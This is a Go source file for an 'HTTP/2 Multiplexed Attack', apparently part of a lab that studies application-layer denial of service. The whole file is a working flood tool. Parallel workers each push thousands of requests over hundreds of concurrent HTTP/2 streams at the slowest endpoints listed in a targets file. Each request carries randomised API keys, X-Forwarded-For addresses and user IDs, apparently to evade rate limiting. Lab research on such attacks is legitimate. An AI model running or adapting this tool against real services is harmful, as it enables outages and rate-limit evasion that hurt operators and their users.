//go:build ignore

// Algorithm 5 - HTTP/2 Multiplexed Attack, fixed implementation.
//
// This standalone version keeps the original file untouched and addresses
// correctness issues in the first implementation:
//   - no shared math/rand.Rand across goroutines;
//   - explicit one-HTTP/2-connection-per-worker behavior;
//   - flag validation;
//   - correct cancellation handling;
//   - safer URL normalization.
//
// Run from attacks/:
//
//	go run algorithm5_http2_mux_fixed.go \
//	    -target https://localhost:8443 \
//	    -targets-file ../results/targets.json \
//	    -clients 15 \
//	    -requests 2000 \
//	    -streams 200 \
//	    -insecure
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/csv"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

type targetEntry struct {
	Method string `json:"method"`
	Path   string `json:"path"`
}

type targetsDoc struct {
	BaseURL        string        `json:"base_url"`
	HeavyByLatency []targetEntry `json:"heavy_by_latency"`
	TargetList     []targetEntry `json:"target_list"`
}

type resultRow struct {
	worker    int
	iteration int
	method    string
	path      string
	status    int
	latencyMS float64
	epoch     int64
	err       string
}

var apiKeyPrefixes = []string{"AX001-", "BX001-", "CC001-", "ZZ000-"}
var alphanum = []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")

func randString(rng *rand.Rand, n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = alphanum[rng.Intn(len(alphanum))]
	}
	return string(b)
}

func randAPIKey(rng *rand.Rand) string {
	return apiKeyPrefixes[rng.Intn(len(apiKeyPrefixes))] + randString(rng, 8)
}

func randXFF(rng *rand.Rand) string {
	return fmt.Sprintf("10.%d.%d.%d",
		rng.Intn(256), rng.Intn(256), rng.Intn(254)+1)
}

func newRequestRNG(workerID, iteration int) *rand.Rand {
	seed := uint64(time.Now().UnixNano())
	seed ^= uint64(workerID+1) * 0x9e3779b97f4a7c15
	seed ^= uint64(iteration+1) * 0xbf58476d1ce4e5b9
	return rand.New(rand.NewSource(int64(seed)))
}

func newH2Client(insecure bool) *http.Client {
	tlsConf := &tls.Config{
		InsecureSkipVerify: insecure, //nolint:gosec // Lab-only option.
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
	}

	transport := &http2.Transport{
		TLSClientConfig:            tlsConf,
		AllowHTTP:                  false,
		StrictMaxConcurrentStreams: true,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
}

func normalizeBaseURL(raw string) (string, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	if u.Scheme != "https" && u.Scheme != "http" {
		return "", fmt.Errorf("target must use http or https: %s", raw)
	}
	if u.Host == "" {
		return "", fmt.Errorf("target must include host: %s", raw)
	}
	u.Path = ""
	u.RawPath = ""
	u.RawQuery = ""
	u.Fragment = ""
	return strings.TrimRight(u.String(), "/"), nil
}

func splitFullTarget(raw, method string) (string, targetEntry, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return "", targetEntry{}, err
	}
	if u.Scheme != "https" && u.Scheme != "http" {
		return "", targetEntry{}, fmt.Errorf("target must use http or https: %s", raw)
	}
	if u.Host == "" {
		return "", targetEntry{}, fmt.Errorf("target must include host: %s", raw)
	}

	path := u.EscapedPath()
	if path == "" {
		path = "/"
	}
	if u.RawQuery != "" {
		path += "?" + u.RawQuery
	}

	u.Path = ""
	u.RawPath = ""
	u.RawQuery = ""
	u.Fragment = ""
	return strings.TrimRight(u.String(), "/"), targetEntry{
		Method: strings.ToUpper(method),
		Path:   path,
	}, nil
}

func joinTargetURL(baseURL, path string) string {
	if path == "" {
		path = "/"
	}
	return strings.TrimRight(baseURL, "/") + "/" + strings.TrimLeft(path, "/")
}

func pickTarget(rng *rand.Rand, doc targetsDoc, symmetric bool, staticTarget targetEntry) targetEntry {
	if staticTarget.Path != "" {
		return staticTarget
	}
	if symmetric && len(doc.HeavyByLatency) > 0 {
		return doc.HeavyByLatency[0]
	}

	pool := doc.TargetList
	if len(pool) == 0 {
		pool = doc.HeavyByLatency
	}
	if len(pool) == 0 {
		return targetEntry{Method: "GET", Path: "/"}
	}
	return pool[rng.Intn(len(pool))]
}

func writeRow(rows chan<- resultRow, completed *atomic.Int64, row resultRow) {
	rows <- row
	completed.Add(1)
}

func runWorker(
	ctx context.Context,
	workerID int,
	client *http.Client,
	baseURL string,
	doc targetsDoc,
	staticTarget targetEntry,
	requests, streams int,
	symmetric bool,
	rows chan<- resultRow,
	completed *atomic.Int64,
	wg *sync.WaitGroup,
) {
	defer wg.Done()

	sema := make(chan struct{}, streams)
	var innerWg sync.WaitGroup

	for i := 0; i < requests; i++ {
		select {
		case <-ctx.Done():
			innerWg.Wait()
			return
		case sema <- struct{}{}:
		}

		innerWg.Add(1)
		go func(iter int) {
			defer innerWg.Done()
			defer func() { <-sema }()

			rng := newRequestRNG(workerID, iter)
			tgt := pickTarget(rng, doc, symmetric, staticTarget)
			method := strings.ToUpper(tgt.Method)
			if method == "" {
				method = http.MethodGet
			}

			var body io.Reader
			if method != http.MethodGet {
				payload := fmt.Sprintf(
					`{"k":"%s","v":%d}`, randString(rng, 6), rng.Intn(10000))
				body = bytes.NewReader([]byte(payload))
			}

			req, err := http.NewRequestWithContext(
				ctx, method, joinTargetURL(baseURL, tgt.Path), body)
			if err != nil {
				writeRow(rows, completed, resultRow{
					worker: workerID, iteration: iter, method: method,
					path: tgt.Path, status: -1, epoch: time.Now().Unix(),
					err: err.Error(),
				})
				return
			}

			req.Header.Set("X-API-KEY", randAPIKey(rng))
			req.Header.Set("X-Forwarded-For", randXFF(rng))
			req.Header.Set("X-User-Id", "u-"+randString(rng, 6))
			req.Header.Set("User-Agent", "Algo5-H2-Fixed/"+strconv.Itoa(workerID))
			req.Header.Set("Accept", "application/json")
			if method != http.MethodGet {
				req.Header.Set("Content-Type", "application/json")
			}

			start := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(start)

			status := -1
			errStr := ""
			if err != nil {
				errStr = err.Error()
			} else {
				status = resp.StatusCode
				_, _ = io.Copy(io.Discard, resp.Body)
				_ = resp.Body.Close()
			}

			writeRow(rows, completed, resultRow{
				worker: workerID, iteration: iter, method: method,
				path: tgt.Path, status: status,
				latencyMS: float64(elapsed.Microseconds()) / 1000.0,
				epoch:     time.Now().Unix(), err: errStr,
			})
		}(i)
	}

	innerWg.Wait()
}

func defaultOutPath() string {
	for _, dir := range []string{
		os.Getenv("LAB_RESULTS"),
		"../results",
		"./results",
	} {
		if dir == "" {
			continue
		}
		if st, err := os.Stat(dir); err == nil && st.IsDir() {
			return filepath.Join(dir, fmt.Sprintf("h2mux_fixed_%d.csv", time.Now().Unix()))
		}
	}
	_ = os.MkdirAll("./results", 0o755)
	return filepath.Join("./results", fmt.Sprintf("h2mux_fixed_%d.csv", time.Now().Unix()))
}

func loadTargets(path string) (targetsDoc, error) {
	f, err := os.Open(path)
	if err != nil {
		return targetsDoc{}, err
	}
	defer f.Close()

	var doc targetsDoc
	if err := json.NewDecoder(f).Decode(&doc); err != nil {
		return targetsDoc{}, err
	}
	return doc, nil
}

func validateFlags(target string, clients, requests, streams int) error {
	if target == "" {
		return errors.New("-target required")
	}
	if clients <= 0 {
		return errors.New("-clients must be greater than 0")
	}
	if requests < 0 {
		return errors.New("-requests must be greater than or equal to 0")
	}
	if streams <= 0 {
		return errors.New("-streams must be greater than 0")
	}
	return nil
}

func main() {
	target := flag.String("target", "",
		"Required. Base URL, or a single full URL when -targets-file is empty.")
	targetsFile := flag.String("targets-file", "",
		"Optional. JSON produced by algorithm2_identify.py.")
	method := flag.String("method", "GET",
		"HTTP method used when -targets-file is empty.")
	clients := flag.Int("clients", 15, "Number of attacker workers/TCP connections.")
	requests := flag.Int("requests", 2000, "Requests per worker.")
	streams := flag.Int("streams", 200, "Max in-flight HTTP/2 streams per worker.")
	symmetric := flag.Bool("symmetric", true,
		"true = use heaviest target; false = choose from full target list.")
	insecure := flag.Bool("insecure", false, "Skip TLS verification.")
	outPath := flag.String("out", "", "Output CSV path.")
	flag.Parse()

	if err := validateFlags(*target, *clients, *requests, *streams); err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: %v\n", err)
		os.Exit(2)
	}

	var doc targetsDoc
	staticTarget := targetEntry{}
	var baseURL string
	var err error

	if *targetsFile != "" {
		doc, err = loadTargets(*targetsFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "load targets: %v\n", err)
			os.Exit(1)
		}
		baseURL, err = normalizeBaseURL(*target)
	} else {
		baseURL, staticTarget, err = splitFullTarget(*target, *method)
	}
	if err != nil {
		fmt.Fprintf(os.Stderr, "target: %v\n", err)
		os.Exit(2)
	}

	if *outPath == "" {
		*outPath = defaultOutPath()
	}

	out, err := os.Create(*outPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "create csv: %v\n", err)
		os.Exit(1)
	}
	defer out.Close()

	writer := csv.NewWriter(out)
	if err := writer.Write([]string{
		"worker", "iteration", "epoch", "method", "path", "status", "latency_ms", "error",
	}); err != nil {
		fmt.Fprintf(os.Stderr, "write csv header: %v\n", err)
		os.Exit(1)
	}

	rows := make(chan resultRow, *clients**streams*2)
	var writerWg sync.WaitGroup
	var writerErr atomic.Value
	writerWg.Add(1)
	go func() {
		defer writerWg.Done()
		for row := range rows {
			if err := writer.Write([]string{
				strconv.Itoa(row.worker),
				strconv.Itoa(row.iteration),
				strconv.FormatInt(row.epoch, 10),
				row.method,
				row.path,
				strconv.Itoa(row.status),
				strconv.FormatFloat(row.latencyMS, 'f', 2, 64),
				row.err,
			}); err != nil {
				writerErr.Store(err)
			}
		}
		writer.Flush()
		if err := writer.Error(); err != nil {
			writerErr.Store(err)
		}
	}()

	fmt.Fprintf(os.Stderr,
		"[+] HTTP/2 multiplexed attack fixed | base=%s | clients=%d | reqs/c=%d | streams/c=%d | symmetric=%v\n",
		baseURL, *clients, *requests, *streams, *symmetric)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	var wg sync.WaitGroup
	var completed atomic.Int64
	start := time.Now()

	for workerID := 0; workerID < *clients; workerID++ {
		wg.Add(1)
		go runWorker(ctx, workerID, newH2Client(*insecure), baseURL, doc, staticTarget,
			*requests, *streams, *symmetric, rows, &completed, &wg)
	}

	wg.Wait()
	close(rows)
	writerWg.Wait()

	if err, ok := writerErr.Load().(error); ok && err != nil {
		fmt.Fprintf(os.Stderr, "write csv: %v\n", err)
		os.Exit(1)
	}

	elapsed := time.Since(start)
	total := completed.Load()
	rps := 0.0
	if elapsed > 0 {
		rps = float64(total) / elapsed.Seconds()
	}
	fmt.Fprintf(os.Stderr,
		"[+] done in %s | total=%d | ~%.1f rps | csv=%s\n",
		elapsed.Truncate(time.Millisecond), total, rps, *outPath)
}
